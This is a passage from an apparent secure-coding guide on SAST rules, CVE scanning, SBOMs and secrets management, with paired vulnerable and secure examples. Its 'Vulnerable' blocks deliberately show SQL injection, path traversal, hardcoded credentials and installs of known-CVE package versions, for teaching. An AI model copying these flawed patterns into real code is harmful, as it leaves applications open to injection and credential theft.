    pattern: jwt.verify($TOKEN, $SECRET)
    pattern-not: jwt.verify($TOKEN, $SECRET, {algorithms: [...]})
    message: "jwt.verify() must specify an algorithms array to prevent algorithm confusion attacks"
    languages: [typescript, javascript]
    severity: ERROR
    metadata:
      cwe: "CWE-347"

  # Ban eval() usage
  - id: ban-eval
    pattern: eval(...)
    message: "eval() is a security risk. Use JSON.parse() for data or refactor to avoid dynamic code execution."
    languages: [typescript, javascript]
    severity: ERROR
    metadata:
      cwe: "CWE-95"

  # Ban Math.random() for security-sensitive values
  - id: no-math-random-crypto
    patterns:
      - pattern: Math.random()
      - pattern-inside: |
          $TOKEN = ...
    message: "Math.random() is not cryptographically secure. Use crypto.randomBytes() or crypto.randomUUID()"
    languages: [typescript, javascript]
    severity: WARNING
    metadata:
      cwe: "CWE-338"

  # Detect unvalidated redirects
  - id: unvalidated-redirect
    patterns:
      - pattern: res.redirect($URL)
      - pattern-not: res.redirect("/...")
      - pattern-not-inside: |
          if (ALLOWED_URLS.includes($URL)) { ... }
    message: "Open redirect detected. Validate redirect URLs against an allowlist."
    languages: [typescript, javascript]
    severity: ERROR
    metadata:
      cwe: "CWE-601"

  # Ensure all express routes have auth middleware
  - id: express-missing-auth-middleware
    patterns:
      - pattern: app.$METHOD('/api/...', $HANDLER)
      - pattern-not: app.$METHOD('/api/...', requireAuth, ...)
      - pattern-not: app.$METHOD('/api/public/...', ...)
    message: "API route missing requireAuth middleware. Add authentication or move to /api/public/"
    languages: [typescript, javascript]
    severity: WARNING
```

```yaml
# ✅ GitHub Actions — Semgrep in CI
name: Semgrep SAST
on:
  push:
    branches: [main]
  pull_request:

jobs:
  semgrep:
    runs-on: ubuntu-latest
    container:
      image: semgrep/semgrep

    steps:
      - uses: actions/checkout@v4

      - name: Run Semgrep — custom + OWASP rules
        run: |
          semgrep \
            --config .semgrep/security.yml \
            --config "p/owasp-top-ten" \
            --config "p/nodejs-security" \
            --config "p/secrets" \
            --sarif \
            --output semgrep.sarif \
            --error              # exit non-zero on findings
        env:
          SEMGREP_APP_TOKEN: ${{ secrets.SEMGREP_APP_TOKEN }}

      - name: Upload SARIF
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep.sarif
```

```bash
# ✅ Run locally
pip install semgrep

# Run org rules + OWASP Top 10 ruleset
semgrep --config .semgrep/security.yml --config "p/owasp-top-ten" .

# Run against a specific file
semgrep --config "p/nodejs-security" src/routes/auth.ts

# Available rulesets: https://semgrep.dev/r
# p/owasp-top-ten, p/secrets, p/nodejs-security,
# p/react, p/typescript, p/jwt, p/sql-injection

# ✅ Pre-commit hook
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/semgrep/semgrep
    rev: v1.70.0
    hooks:
      - id: semgrep
        args: ['--config', '.semgrep/security.yml', '--error']
```

Start with Semgrep's official rulesets (`p/owasp-top-ten`, `p/nodejs-security`). Then add custom rules for your specific patterns and frameworks. Use `# nosemgrep: rule-id` with a comment to suppress false positives with documented justification.

Reference: [Semgrep Documentation](https://semgrep.dev/docs/) | [Semgrep Registry](https://semgrep.dev/r)

---

## Integrate SonarQube or SonarCloud as a PR Quality Gate

**Impact: HIGH — CWE-1006**

SonarQube (self-hosted) and SonarCloud (SaaS) perform SAST — scanning source code without executing it — to detect injection vulnerabilities, hardcoded secrets, insecure APIs, SQL injection, XSS, SSRF, path traversal, and 2,000+ other security rules across 30+ languages. Configured as a **PR quality gate**, it blocks merges when new Security Hotspots or Vulnerabilities of severity HIGH/CRITICAL are introduced.

**Vulnerable (no SAST gate — insecure code merged):**

```typescript
// ❌ This code gets merged with no SAST check:
app.get('/user', async (req, res) => {
  // SQL injection — SonarQube rule: S3649 "SQL queries should not be vulnerable to injection attacks"
  const result = await db.query(`SELECT * FROM users WHERE id = ${req.query.id}`)
  res.json(result)
})

// ❌ Hardcoded password — SonarQube rule: S2068 "Credentials should not be hard-coded"
const password = 'admin123'

// ❌ Path traversal — SonarQube rule: S6096
const file = fs.readFileSync('./uploads/' + req.params.name)
```

**Secure (SonarQube integrated as a blocking PR gate):**

```yaml
# ✅ sonar-project.properties — project configuration
sonar.projectKey=my-org_my-project
sonar.projectName=My Project
sonar.sources=src
sonar.tests=src
sonar.test.inclusions=**/*.test.ts,**/*.spec.ts
sonar.typescript.lcov.reportPaths=coverage/lcov.info

# Security-focused quality gate settings (configure in SonarQube UI):
# Gate: "Security Gate"
# Condition 1: New Vulnerabilities = 0        (blocks on any new vuln)
# Condition 2: New Security Hotspots = 0      (requires hotspot review)
# Condition 3: Security Rating on New Code: A  (no critical/high vulns)
```

```yaml
# ✅ GitHub Actions — SonarCloud integration (free for open source)
name: SonarCloud SAST
on:
  push:
    branches: [main]
  pull_request:
    types: [opened, synchronize, reopened]

jobs:
  sonarcloud:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0          # Shallow clones disable blame/history analysis

      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: 22

      - name: Install and test (with coverage)
        run: |
          npm ci
          npm test -- --coverage --coverageReporters=lcov

      - name: SonarCloud Scan
        uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}   # PR decoration
          SONAR_TOKEN:  ${{ secrets.SONAR_TOKEN }}    # SonarCloud auth
        with:
          args: >
            -Dsonar.qualitygate.wait=true
            -Dsonar.qualitygate.timeout=300

      # ✅ qualitygate.wait=true — fails the action if gate is not passed
      # This blocks the PR merge via required status checks
```

```yaml
# ✅ Self-hosted SonarQube (Docker)
# docker-compose.yml
services:
  sonarqube:
    image: sonarqube:community
    ports:
      - "9000:9000"
    environment:
      SONAR_JDBC_URL:      jdbc:postgresql://db:5432/sonar
      SONAR_JDBC_USERNAME: sonar
      SONAR_JDBC_PASSWORD: sonar
    volumes:
      - sonar_data:/opt/sonarqube/data
      - sonar_extensions:/opt/sonarqube/extensions

# ✅ GitHub Actions — self-hosted SonarQube
- name: SonarQube Scan
  uses: SonarSource/sonarqube-scan-action@master
  env:
    SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
    SONAR_HOST_URL: ${{ secrets.SONAR_HOST_URL }}
  with:
    args: >
      -Dsonar.qualitygate.wait=true
```

```bash
# ✅ Key SonarQube security rules to enable (OWASP Top 10 mapped)
# S3649 — SQL Injection                    → OWASP A03
# S5131 — XSS Reflected                   → OWASP A03
# S2631 — ReDoS                           → OWASP A03
# S4790 — Weak cryptographic hash         → OWASP A02
# S5542 — Weak encryption mode            → OWASP A02
# S2068 — Hardcoded credentials           → OWASP A02
# S5144 — SSRF                            → OWASP A10
# S6096 — Path traversal                  → OWASP A01
# S5443 — Temp file creation with insecure permissions → OWASP A01
# S4784 — Command injection               → OWASP A03
```

Enable the **OWASP Top 10** security profile in SonarQube. Use branch analysis (Developer Edition+) so PRs show only *new* issues. Require the "Sonar Way Security" quality gate in your branch protection rules.

Reference: [SonarQube Security Rules](https://rules.sonarsource.com/typescript/tag/owasp-top10/) | [SonarCloud](https://sonarcloud.io)

---

## 10. Software Composition Analysis & CVE Scanning {#section-10}

**Impact:** CRITICAL
**Description:** SCA tools (JFrog Xray, OWASP Dependency Check, Trivy) scan every dependency and container layer for known CVEs (OWASP A03). HIGH and CRITICAL findings must block the build pipeline. Integrate scanning at every stage: developer local, PR, CI, and registry/artifact level.

## Block Builds When HIGH or CRITICAL CVE Versions Are Detected

**Impact: CRITICAL — CWE-1104**

Shipping code with known HIGH/CRITICAL CVEs is a preventable breach. Every package installed must be checked against the NVD (CVSS ≥ 7.0) before deployment. Use a layered approach: block at `npm install` time, block in CI, and block at the artifact registry (JFrog Xray). Treat CVE checks as a first-class build step — not an optional check.

**Vulnerable (CVE-carrying versions installed without check):**

```bash
# ❌ Specific versions with known CRITICAL CVEs installed without scanning
npm install lodash@4.17.4        # CVE-2019-10744 CRITICAL — prototype pollution
npm install axios@0.21.0         # CVE-2021-3749 HIGH — ReDoS
npm install jsonwebtoken@8.5.1   # CVE-2022-23529 HIGH — arbitrary file write
npm install minimist@1.2.5       # CVE-2021-44906 CRITICAL — prototype pollution
npm install log4js@6.3.0         # CVE-2022-21704 HIGH — sensitive info exposure

# ❌ CI pipeline with no version-CVE gate
npm install
npm run build
docker push myapp:latest  # vulnerable versions shipped to production
```

**Secure (layered CVE version blocking):**

```bash
# ✅ Layer 1: npm audit before install (catches known bad versions immediately)
npm audit --audit-level=high || exit 1
npm install

# ✅ Layer 2: Check specific package versions against OSV database
# OSV (Open Source Vulnerabilities) — Google's free, fast CVE API
curl -s -X POST https://api.osv.dev/v1/query \
  -H "Content-Type: application/json" \
  -d '{
    "version": "4.17.4",
    "package": { "name": "lodash", "ecosystem": "npm" }
  }' | jq '.vulns | length'
# Returns number of known vulnerabilities for this exact version
```

```javascript
// ✅ Pre-install CVE check script — run before npm install
// scripts/check-cve-versions.mjs
import { readFileSync } from 'fs'

const pkg = JSON.parse(readFileSync('./package.json', 'utf-8'))
const allDeps = {
  ...pkg.dependencies,
  ...pkg.devDependencies,
}

async function checkCVEs() {
  const queries = Object.entries(allDeps).map(([name, version]) => ({
    version: version.replace(/^[\^~>=<]/, ''),  // strip semver operators
    package: { name, ecosystem: 'npm' },
  }))

  const res = await fetch('https://api.osv.dev/v1/querybatch', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ queries }),
  })
  const { results } = await res.json()

  let criticalFound = false
  results.forEach(({ vulns }, i) => {
    if (!vulns?.length) return
    const [name, version] = Object.entries(allDeps)[i]
    const critical = vulns.filter(v =>
      v.severity?.some(s => s.score >= 7.0)
    )
    if (critical.length > 0) {
      console.error(`❌ HIGH/CRITICAL CVE in ${name}@${version}: ${critical.map(v => v.id).join(', ')}`)
      criticalFound = true
    }
  })

  if (criticalFound) {
    console.error('\n🚨 Build blocked: update the affected packages before proceeding.')
    process.exit(1)
  }
  console.log('✅ No HIGH/CRITICAL CVEs found in declared dependencies.')
}

checkCVEs()
```

```yaml
# ✅ GitHub Actions — multi-layer CVE gate
name: CVE Version Gate
on: [push, pull_request]

jobs:
  cve-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      # Layer 1: npm audit
      - name: npm audit (HIGH+)
        run: npm audit --audit-level=high

      # Layer 2: OSV Scanner (Google's open-source multi-ecosystem scanner)
      - name: OSV Scanner
        uses: google/osv-scanner-action@v1
        with:
          scan-args: |-
            --lockfile=package-lock.json
            --fail-on-vuln

      # Layer 3: Trivy filesystem scan
      - name: Trivy FS Scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type:       "fs"
          exit-code:       "1"
          severity:        "HIGH,CRITICAL"
          ignore-unfixed:  true

      # Layer 4: Snyk (optional — deeper analysis with fix suggestions)
      - name: Snyk Test
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          args: --severity-threshold=high --fail-on=all
```

```bash
# ✅ Renovate / Dependabot — auto-PR for vulnerable version upgrades
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "daily"      # check daily
    open-pull-requests-limit: 10
    # Auto-merge patch updates, require review for minor/major
    groups:
      security-patches:
        applies-to: security-updates
        update-types: ["patch"]
```

Use `ignore-unfixed: true` to suppress findings with no available fix. Maintain a `cve-exceptions.json` with documented justifications for each accepted risk, reviewed quarterly.

Reference: [OSV Database](https://osv.dev/) | [NVD CVSS Scores](https://nvd.nist.gov/vuln-metrics/cvss) | [OWASP A06](https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/)

---

## Integrate JFrog Xray for Deep Artifact and Container SCA

**Impact: CRITICAL — CWE-1104**

JFrog Xray performs recursive Software Composition Analysis (SCA) on every artifact stored in JFrog Artifactory — including transitive dependencies, container layers, and compiled binaries. Unlike `npm audit` (which only scans metadata), Xray inspects actual artifact content and matches against multiple vulnerability databases (NVD, VulnDB, GitHub Advisory). Configure Xray policies to **block downloads and promotions** when HIGH or CRITICAL CVEs are found.

**Vulnerable (no Xray policy — artifacts flow through untouched):**

```bash
# ❌ Artifactory without Xray — any artifact is served regardless of CVEs
curl -u user:password \
  "https://artifactory.example.com/artifactory/npm-local/lodash/-/lodash-4.17.4.tgz" \
  -O
# lodash 4.17.4 has CVE-2019-10744 (CRITICAL — prototype pollution)
# No scan, no block, no alert
```

**Secure (Xray security policy that blocks HIGH/CRITICAL):**

```bash
# ✅ Step 1: Create a Security Policy via Xray REST API
curl -u admin:password -X POST \
  "https://xray.example.com/api/v2/policies" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "block-high-critical-cves",
    "type": "security",
    "rules": [
      {
        "name": "block-critical",
        "criteria": {
          "min_severity": "High",
          "fix_version_dependant": false
        },
        "actions": {
          "webhooks": [],
          "mails": ["security-team@example.com"],
          "block_download": {
            "unscanned": true,
            "active": true
          },
          "block_release_bundle_distribution": true,
          "fail_build": true,
          "notify_deployer": true,
          "notify_watch_recipients": true
        },
        "priority": 1
      }
    ]
  }'

# ✅ Step 2: Create a Watch that applies the policy to all repos
curl -u admin:password -X POST \
  "https://xray.example.com/api/v2/watches" \
  -H "Content-Type: application/json" \
  -d '{
    "general_data": {
      "name": "all-repos-watch",
      "description": "Watch all repositories for HIGH/CRITICAL CVEs",
      "active": true
    },
    "project_resources": {
      "resources": [
        {
          "type": "all_repos",
          "filters": []
        }
      ]
    },
    "assigned_policies": [
      { "name": "block-high-critical-cves", "type": "security" }
    ]
  }'
```

```yaml
# ✅ GitHub Actions — fail build if Xray scan finds HIGH/CRITICAL
- name: JFrog CLI Setup
  uses: jfrog/setup-jfrog-cli@v4
  env:
    JF_URL:      ${{ secrets.JF_URL }}
    JF_USER:     ${{ secrets.JF_USER }}
    JF_PASSWORD: ${{ secrets.JF_PASSWORD }}

- name: Build and publish to Artifactory
  run: |
    jf npm install --build-name=${{ github.repository }} --build-number=${{ github.run_number }}
    jf rt build-publish ${{ github.repository }} ${{ github.run_number }}

- name: Xray Build Scan — fail on HIGH/CRITICAL
  run: |
    jf build-scan \
      --fail=true \
      --severity=High \
      ${{ github.repository }} ${{ github.run_number }}
  # Exits non-zero if HIGH or CRITICAL CVEs found — fails the pipeline
```

```bash
# ✅ Scan a Docker image directly with Xray CLI
jf docker scan myapp:latest

# ✅ Scan a directory (e.g., build output)
jf scan ./dist/ --fail=true --severity=High

# ✅ View detailed CVE report
jf build-scan --format=json myapp 42 | jq '.violations[] | select(.severity == "Critical")'
```

Configure Xray to index all repositories immediately after upload. Use **Release Bundle** promotion policies to ensure only Xray-approved artifacts reach production registries.

Reference: [JFrog Xray Documentation](https://jfrog.com/help/r/jfrog-security-documentation/jfrog-xray)

---

## Run OWASP Dependency Check for CVE Scanning in CI

**Impact: CRITICAL — CWE-1104**

OWASP Dependency Check (ODC) is a free, multi-language SCA tool that identifies project dependencies and checks if there are any known, publicly disclosed CVEs from the NVD (National Vulnerability Database). Unlike `npm audit`, ODC works across Java, .NET, Python, Ruby, Node.js, and more — making it ideal for polyglot environments and as a universal pipeline step. Configure it to **fail the build** on CVSS score ≥ 7 (HIGH/CRITICAL).

**Vulnerable (no OWASP Dependency Check in pipeline):**

```bash
# ❌ Dependencies scanned only with npm audit — language-limited, not exhaustive
npm audit --audit-level=high
# Misses: transitive jar files, Python packages bundled in Docker, .NET libs
```

**Secure (OWASP Dependency Check in CI — multi-language):**

```yaml
# ✅ GitHub Actions — OWASP Dependency Check with CVSS threshold
name: OWASP Dependency Check
on: [push, pull_request]

jobs:
  dependency-check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run OWASP Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project:    "${{ github.repository }}"
          path:       "."
          format:     "HTML,JSON,SARIF"
          args: >-
            --failOnCVSS 7
            --enableRetired
            --enableExperimental
            --nvdApiKey ${{ secrets.NVD_API_KEY }}
            --suppressionFile .odc-suppressions.xml
        env:
          JAVA_HOME: /opt/jdk

      - name: Upload report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: odc-report
          path: reports/

      - name: Upload SARIF to GitHub Security tab
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: reports/dependency-check-report.sarif
```

```bash
# ✅ Run locally via CLI (Docker)
docker run --rm \
  -e user=$USER \
  -u $(id -u):$(id -g) \
  -v $(pwd):/src \
  -v $(pwd)/odc-reports:/report \
  owasp/dependency-check:latest \
  --scan /src \
  --format HTML \
  --format JSON \
  --project "my-project" \
  --failOnCVSS 7 \
  --out /report

# ✅ With NVD API key (avoid rate limiting)
# Get free key at: https://nvd.nist.gov/developers/request-an-api-key
docker run --rm \
  -v $(pwd):/src \
  -v odc-data:/usr/share/dependency-check/data \
  owasp/dependency-check:latest \
  --scan /src \
  --nvdApiKey $NVD_API_KEY \
  --failOnCVSS 7 \
  --format JSON \
  --out /src/odc-reports
```

```xml
<!-- ✅ .odc-suppressions.xml — suppress false positives with documented justification -->
<?xml version="1.0" encoding="UTF-8"?>
<suppressions xmlns="https://jeremylong.github.io/DependencyCheck/dependency-suppression.1.3.xsd">
  <suppress>
    <notes>
      False positive: CVE-2021-44228 (Log4Shell) does not apply to our log4j-api usage
      which does not include the vulnerable JNDILookup class.
      Reviewed: 2026-01-15, reviewer: security-team
      Re-review date: 2026-07-15
    </notes>
    <cve>CVE-2021-44228</cve>
    <filePath regex="true">.*log4j-api-.*\.jar</filePath>
  </suppress>
</suppressions>
```

Set `--failOnCVSS 7` to block HIGH (7.0–8.9) and CRITICAL (9.0–10.0) findings. Use NVD API key to avoid the 2-hour data update rate limit. Cache the NVD database between CI runs to speed up scans.

Reference: [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)

---

## Generate and Publish a Software Bill of Materials (SBOM)

**Impact: CRITICAL — CWE-1104**

A Software Bill of Materials (SBOM) is a formal, machine-readable inventory of every component in your software — direct dependencies, transitive dependencies, OS packages, and containers. SBOMs are required by US Executive Order 14028 for government software, and increasingly required by enterprise customers for vendor risk management. Without an SBOM, you cannot quickly answer "are we affected by Log4Shell?" when a new zero-day drops.

**Vulnerable (no SBOM — blind to component inventory):**

```bash
# ❌ No SBOM generated — when Log4Shell (CVE-2021-44228) dropped:
# Question: "Do we use Log4j?"
# Answer: "We need to grep every repo manually... this will take days"
# Impact: 72-hour incident response delay
```

**Secure (automated SBOM generation in CI):**

```yaml
# ✅ GitHub Actions — generate CycloneDX SBOM on every release
name: Generate SBOM
on:
  push:
    branches: [main]
  release:
    types: [created]

jobs:
  sbom:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      packages: write
      security-events: write

    steps:
      - uses: actions/checkout@v4

      # ✅ CycloneDX SBOM for Node.js
      - name: Generate CycloneDX SBOM
        uses: CycloneDX/gh-node-module-generatebom@v1
        with:
          path: "./"
          output: "./bom.json"

      # ✅ Syft for richer multi-ecosystem SBOM (also supports Docker)
      - name: Generate SBOM with Syft
        uses: anchore/sbom-action@v0
        with:
          path:            "./"
          format:          "cyclonedx-json"   # or spdx-json
          output-file:     "./sbom.cyclonedx.json"
          artifact-name:   "sbom-${{ github.sha }}"

      # ✅ Attach SBOM to GitHub release
      - name: Upload SBOM to release
        if: github.event_name == 'release'
        uses: softprops/action-gh-release@v2
        with:
          files: ./sbom.cyclonedx.json

      # ✅ Publish SBOM as OCI artifact alongside container image
      - name: Attach SBOM to container
        run: |
          docker build -t myapp:${{ github.sha }} .
          docker push myapp:${{ github.sha }}
          # Attach SBOM as OCI attestation
          cosign attest --predicate sbom.cyclonedx.json \
            --type cyclonedx \
            myapp:${{ github.sha }}
```

```bash
# ✅ Generate SBOM locally

# Syft (multi-format: SPDX, CycloneDX, Syft JSON)
brew install syft
syft dir:. -o cyclonedx-json=sbom.json       # directory
syft myapp:latest -o cyclonedx-json=sbom.json # container image

# CycloneDX CLI for Node.js
npx @cyclonedx/cyclonedx-npm --output-format JSON --output-file bom.json

# SBOM for Python
pip install cyclonedx-bom
cyclonedx-bom --requirements requirements.txt --output bom.json

# Trivy can also generate SBOMs
trivy image --format cyclonedx --output sbom.json myapp:latest
trivy fs    --format spdx-json  --output sbom.spdx.json .
```

```javascript
// ✅ Query your SBOM to answer "are we affected by CVE-X?"
// When a new zero-day drops, scan your SBOM instantly:

import { readFileSync } from 'fs'

const sbom = JSON.parse(readFileSync('./sbom.cyclonedx.json', 'utf-8'))
const components = sbom.components || []

// Find all versions of a specific package
const log4j = components.filter(c =>
  c.name?.toLowerCase().includes('log4j')
)
console.log('Log4j components found:', log4j.map(c => `${c.name}@${c.version}`))

// Cross-reference with OSV for specific CVE
async function checkSbomForCve(sbomPath: string, cveId: string) {
  const sbom = JSON.parse(readFileSync(sbomPath, 'utf-8'))
  const findings = []
  for (const component of sbom.components || []) {
    const res = await fetch('https://api.osv.dev/v1/query', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        version: component.version,
        package: { name: component.name, ecosystem: 'npm' },
      }),
    })
    const { vulns } = await res.json()
    const match = vulns?.find(v => v.aliases?.includes(cveId) || v.id === cveId)
    if (match) findings.push({ component: `${component.name}@${component.version}`, cve: cveId })
  }
  return findings
}
```

Store SBOMs in your artifact registry (Artifactory, ECR, GHCR) alongside every release. Use CycloneDX (preferred) or SPDX 2.3 format. Update SBOMs on every build — stale SBOMs are dangerous.

Reference: [CISA SBOM Resources](https://www.cisa.gov/sbom) | [CycloneDX Specification](https://cyclonedx.org/) | [NTIA SBOM Minimum Elements](https://www.ntia.gov/report/2021/minimum-elements-software-bill-materials-sbom)

---

## Use Trivy to Scan Containers and Filesystems for CVEs

**Impact: CRITICAL — CWE-1104**

Container images bundle OS packages (Alpine, Debian, Ubuntu) alongside application dependencies — all of which can carry CVEs. Trivy (by Aqua Security) is the industry-standard open-source scanner for containers, filesystems, git repos, and IaC. It detects vulnerabilities in OS packages, language packages (npm, pip, gem, cargo), and misconfigurations. Scan at build time, block on HIGH/CRITICAL, and re-scan images in your registry continuously.

**Vulnerable (container deployed without CVE scan):**

```dockerfile
# ❌ Base image with hundreds of known CVEs — never scanned
FROM node:18
# node:18 (Debian bookworm) may carry 50+ OS-level CVEs at any given time
COPY . .
RUN npm install
```

**Secure (Trivy scan blocking HIGH/CRITICAL, minimal base image):**

```dockerfile
# ✅ Use minimal base images to reduce attack surface
FROM node:22-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --omit=dev
COPY . .

# ✅ Final image — distroless has near-zero OS CVEs
FROM gcr.io/distroless/nodejs22-debian12
WORKDIR /app
COPY --from=builder /app .
CMD ["server.js"]
```

```yaml
# ✅ GitHub Actions — Trivy scan blocking HIGH/CRITICAL in CI
name: Container Security Scan
on: [push, pull_request]

jobs:
  trivy:
    runs-on: ubuntu-latest
    permissions:
      security-events: write   # for SARIF upload

    steps:
      - uses: actions/checkout@v4

      # ✅ Scan filesystem BEFORE building (catches npm deps early)
      - name: Trivy Filesystem Scan
        uses: aquasecurity/trivy-action@master
        with:
          scan-type:       "fs"
          scan-ref:        "."
          exit-code:       "1"               # fail on findings
          severity:        "HIGH,CRITICAL"   # only block on these
          format:          "sarif"
          output:          "trivy-fs.sarif"
          ignore-unfixed:  true              # skip CVEs without a fix yet

      - name: Build Docker image
        run: docker build -t myapp:${{ github.sha }} .

      # ✅ Scan the built container image
      - name: Trivy Image Scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref:      "myapp:${{ github.sha }}"
          exit-code:      "1"
          severity:       "HIGH,CRITICAL"
          format:         "sarif"
          output:         "trivy-image.sarif"
          ignore-unfixed: true

      - name: Upload SARIF to GitHub Security tab
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: trivy-image.sarif
```

```bash
# ✅ Local scanning
# Install: brew install trivy  |  or  |  apt install trivy

# Scan a Docker image
trivy image --severity HIGH,CRITICAL --exit-code 1 myapp:latest

# Scan a filesystem / project directory
trivy fs --severity HIGH,CRITICAL --exit-code 1 .

# Scan a git repo
trivy repo --severity HIGH,CRITICAL https://github.com/org/repo

# Scan IaC files (Terraform, CloudFormation, Helm)
trivy config --severity HIGH,CRITICAL ./infra/

# JSON output for processing
trivy image --format json --output report.json myapp:latest
cat report.json | jq '[.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL")] | length'

# ✅ Continuous registry scanning (Trivy Operator in Kubernetes)
# kubectl apply -f https://raw.githubusercontent.com/aquasecurity/trivy-operator/main/deploy/static/trivy-operator.yaml
# Auto-scans all pods and exposes VulnerabilityReport CRDs
```

```bash
# ✅ .trivyignore — suppress known false positives with documentation
# CVE-2023-12345
# Reason: Not exploitable in our usage (library function not called)
# Reviewed: 2026-01-15, re-review: 2026-07-15
CVE-2023-12345
```

Use `--ignore-unfixed` to suppress CVEs that have no available fix (reduces noise). Re-scan registry images weekly even without code changes — new CVEs are disclosed continuously.

Reference: [Trivy Documentation](https://aquasecurity.github.io/trivy/)

---

## 11. Secrets & Credentials Management {#section-11}

**Impact:** CRITICAL
**Description:** Leaked credentials are the fastest path to a breach (OWASP A04). Secrets must never appear in source code, logs, or unencrypted storage. Rotation and scanning must be automated.

## Use a Secrets Manager Instead of Plain Environment Files

**Impact: CRITICAL — CWE-312**

Plain `.env` files with production secrets on developer machines or CI runners are a major breach vector. Secrets managers (AWS Secrets Manager, HashiCorp Vault, Doppler) provide centralized storage, access control, audit logs, and automatic rotation. Secrets are injected at runtime — never stored on disk in plaintext.

**Vulnerable (plain .env with production secrets on disk):**

```bash
# ❌ .env.production stored in repo or on developer laptop
STRIPE_SECRET_KEY=sk_live_abc123
DB_PASSWORD=prod_super_secret
JWT_SECRET=my_jwt_secret_key
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

```typescript
// ❌ Loaded from disk — file is a single point of compromise
import 'dotenv/config'
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!)
```

**Secure (secrets manager with runtime injection):**

```typescript
// ✅ AWS Secrets Manager — fetch at startup, cache in memory
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager'

const smClient = new SecretsManagerClient({ region: process.env.AWS_REGION })

interface AppSecrets {
  stripeSecretKey: string
  dbPassword: string
  jwtSecret: string
}

let _secrets: AppSecrets | null = null

export async function getSecrets(): Promise<AppSecrets> {
  if (_secrets) return _secrets
  const response = await smClient.send(
    new GetSecretValueCommand({ SecretId: 'prod/myapp/secrets' })
  )
  _secrets = JSON.parse(response.SecretString!) as AppSecrets
  return _secrets
}

// ✅ Doppler (inject at runtime via CLI — no SDK needed)
// doppler run -- node dist/server.js
// Secrets are available as process.env.STRIPE_SECRET_KEY etc.

// ✅ HashiCorp Vault with app role
import vault from 'node-vault'
const client = vault({ endpoint: process.env.VAULT_ADDR, token: process.env.VAULT_TOKEN })
const { data } = await client.read('secret/data/myapp')
const stripeKey = data.data.stripe_secret_key
```

```yaml
# ✅ GitHub Actions — use repository secrets, never plaintext
jobs:
  deploy:
    steps:
      - name: Deploy
        env:
          STRIPE_SECRET_KEY: ${{ secrets.STRIPE_SECRET_KEY }}
        run: node deploy.js
```

Use `.env` files with non-sensitive local dev config only. Production secrets must go through a secrets manager with audit logging and scoped IAM access.

Reference: [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)

---

## Never Hardcode Secrets, API Keys, or Credentials

**Impact: CRITICAL — CWE-798**

Hardcoded secrets are committed to version control and exposed to anyone with repository access — including CI systems, contractors, and if the repo is public, the entire internet. Secrets accidentally committed persist in git history even after deletion. Use environment variables loaded from a secrets manager, never string literals.

**Vulnerable (secrets in source code):**

```typescript
// ❌ Hardcoded API key — visible in git history forever
const stripe = new Stripe('sk_live_YOUR_STRIPE_SECRET_KEY')

// ❌ Hardcoded database URL with credentials
const db = new PrismaClient({
  datasources: { db: { url: 'postgresql://admin:password123@prod.db.example.com/mydb' } }
})

// ❌ JWT secret in source
const token = jwt.sign(payload, 'my-super-secret-jwt-key')

// ❌ Hardcoded in config file committed to repo
// config.json
// { "aws_secret": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" }
```

**Secure (environment variables + secrets manager):**

```typescript
// ✅ Load from environment — injected by secrets manager at runtime
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!)

// ✅ Fail fast if required secrets are missing
function requireEnv(key: string): string {
  const value = process.env[key]
  if (!value) throw new Error(`Missing required environment variable: ${key}`)
  return value
}

const JWT_SECRET   = requireEnv('JWT_SECRET')
const DATABASE_URL = requireEnv('DATABASE_URL')
const STRIPE_KEY   = requireEnv('STRIPE_SECRET_KEY')

// ✅ Use a secrets manager (AWS Secrets Manager, HashiCorp Vault, Doppler)
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager'
const client = new SecretsManagerClient({ region: 'us-east-1' })

async function getSecret(secretId: string): Promise<string> {
  const response = await client.send(new GetSecretValueCommand({ SecretId: secretId }))
  return response.SecretString!
}
const stripeKey = await getSecret('prod/stripe/secret-key')
```

Add `.env` to `.gitignore`. Use `.env.example` with placeholder values for documentation. Rotate any secret that has been committed — treat it as compromised immediately.

Reference: [OWASP Secrets Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html)

---

## Implement and Test Automatic Secret Rotation

**Impact: HIGH — CWE-798**

